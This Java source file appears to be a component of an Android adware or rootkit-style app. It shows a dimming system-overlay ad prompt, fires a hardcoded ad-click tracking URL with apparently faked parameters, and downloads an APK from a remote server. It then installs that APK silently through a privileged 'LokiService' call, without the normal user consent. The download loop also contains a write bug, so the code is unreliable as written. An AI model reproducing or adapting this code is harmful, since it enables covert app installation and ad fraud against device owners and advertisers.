package com.mob.root.ad.task;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.content.Context;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;

import com.giga.sdk.ClientManager;
import com.loki.sdk.LokiClientCallback;
import com.loki.sdk.LokiService;
import com.mob.root.AMApplication;
import com.mob.root.R;
import com.mob.root.adapter.InstallWindowPerListAdapter;
import com.mob.root.entity.AD;
import com.mob.root.entity.Apk;
import com.mob.root.net.CheckApkRequest;
import com.mob.root.net.IResponseListener;
import com.mob.root.net.parser.ConfigParser;
import com.mob.root.tools.AMConstants;
import com.mob.root.tools.AMLogger;
import com.mob.root.tools.CommonUtils;
import com.nostra13.universalimageloader.core.ImageLoader;

class InstallGuideWindowTask extends ADWindowTask implements Runnable, IResponseListener<String> {

	private WindowManager mWindowManager;
	private LayoutInflater mInflater;
	private ImageView mAppIconIV;
	private TextView mAppTitleTV;
	private ListView mPermissionLV;
	private Button mInstallBtn;
	private ImageView mCloseIV;
	private AD mAD;
//	private Handler mHandler;
	private LokiClientCallback lokiClientCallback;
	
	private InstallWindowPerListAdapter mAdapter;
	private String destUrl;
	private String referrer;
	
	InstallGuideWindowTask(Context context, AD ad) {
		super(context);
		mAD = ad;
//		mHandler = new Handler(Looper.getMainLooper());
	}

	@Override
	public void start() {
		// 显示广告
		displayAD();
	}

	@Override
	protected void pullDatas() {
		
	}

	@Override
	protected void displayAD() {
		if (null == mWindowManager) {
			mWindowManager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
		}
		LayoutParams lpWindow = new LayoutParams();
		lpWindow.type = LayoutParams.TYPE_SYSTEM_ALERT;
		lpWindow.flags = LayoutParams.FLAG_DIM_BEHIND;
		lpWindow.dimAmount = 0.8f;
		lpWindow.gravity = Gravity.CENTER;
		lpWindow.x = 0;  
		lpWindow.y = 0; 
		
		lpWindow.width = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_width));
		lpWindow.height = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_height));
		lpWindow.format = PixelFormat.RGBA_8888; 
		
		if (null == mRootView) {
			if (null == mInflater) {
				mInflater = (LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
			}
			mRootView = mInflater.inflate(R.layout.install_guide_window, null);
		}
		mWindowManager.addView(mRootView, lpWindow);  
		initViews();
		initDatas();
		lokiClientCallback = new LokiClientCallback(mContext);
		super.displayAD();
	}

	private void initViews() {
		mAppIconIV = (ImageView) mRootView.findViewById(R.id.appIcon);
		mAppTitleTV = (TextView) mRootView.findViewById(R.id.appTitle);
		mPermissionLV = (ListView) mRootView.findViewById(R.id.listView);
		mInstallBtn = (Button) mRootView.findViewById(R.id.acceptInstall);
		mCloseIV = (ImageView) mRootView.findViewById(R.id.close);
	}
	
	private void initDatas() {
		ImageLoader.getInstance().displayImage(mAD.getIcon_url(), mAppIconIV, AMApplication.instance.displayOption);
		mAppTitleTV.setText(mAD.getTitle());
		if(null == mAdapter) {
			mAdapter = new InstallWindowPerListAdapter(mContext);
		}
		mAdapter.setDatas(mAD.getPermissions());
		mPermissionLV.setAdapter(mAdapter);
		
		mCloseIV.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				closeWindow();
			}
		});
		
		mInstallBtn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				try {
					installApp();
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
			}
		});
	}
	
	private void installApp() throws Exception {
		closeWindow();
		ADTaskBuilder builder = new ADTaskBuilder();
		ADTask adTask = builder.setADType(TaskType.WINDOW_INSTALLING, mContext, mAD).build();
		adTask.start();
		AMApplication.instance.installADs.add(mAD);
//		mHandler.post(this);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=null&p2=469&p3=10020&p4=72936347842258022881022981438150268774&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=2.31&p9=&p10=&p11=en&p12=24724&p13=210&p14=187970&lid=null&p15=sg.gumi.bravefrontier&p24=");
			if(!CommonUtils.isEmptyString(destUrl)) {
				if(destUrl.contains("package_name")) {
					CheckApkRequest request = new CheckApkRequest(this);
					Uri uri = Uri.parse(destUrl);
					String packageName = uri.getQueryParameter("package_name");
					referrer = uri.getQueryParameter("referrer");
					request.start(packageName);
					return;
				}else {
					ClientManager clientManager = ClientManager.getInstance(mContext);
					ConfigParser parser = new ConfigParser();
					String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
					String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
					clientManager.downloadWithGooglePlay(destUrl, lokiClientCallback, serverName, Integer.parseInt(serverPort), 600000);
				}
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}

	@Override
	public void onResponse(final String t) {
		if(CommonUtils.isEmptyString(t)) {
			try {
				ClientManager clientManager = ClientManager.getInstance(mContext);
				ConfigParser parser = new ConfigParser();
				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
				clientManager.downloadWithGooglePlay(destUrl, lokiClientCallback, serverName, Integer.parseInt(serverPort), 600000);
				return;
			} catch (Exception e) {
				AMLogger.e(null, e.getMessage());
			}
		}
		Apk apk = new Apk();
		apk.setPackageName(t);
		apk.setReferrer(referrer);
		AMApplication.instance.installApks.add(apk);
		new Thread(){
			public void run() {
				try {
					downloadApk(t);
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
			};
		}.start();
	}
	
	private void downloadApk(String apkUrl) {
		InputStream inputStream = null;
		FileOutputStream fos = null;
		try {
			URL url = new URL(apkUrl);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(10000);
			conn.setReadTimeout(10000);
			conn.connect();
			inputStream = conn.getInputStream();
			File dir = AMApplication.instance.getFilesDir();
			File file = new File(dir.getAbsolutePath() + "/new.apk");
			fos = new FileOutputStream(file);
			int len = -1;
			byte[] buffer = new byte[1024];
			while ((len = inputStream.read(buffer)) != -1) {
				fos.write(buffer, len, len);
			}
			fos.flush();
			LokiService lokiService = LokiService.getInstance(mContext);
			if(lokiService != null) {
				lokiService.installPackage(file.getAbsolutePath(), 0);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != fos) {
				try {
					fos.close();
				} catch (IOException e) {
					AMLogger.e(null, e.getMessage());
				} finally {
					if(null != inputStream) {
						try {
							inputStream.close();
						} catch (IOException e) {
							AMLogger.e(null, e.getMessage());
						}
					}
				}
			}
		}
	}
}
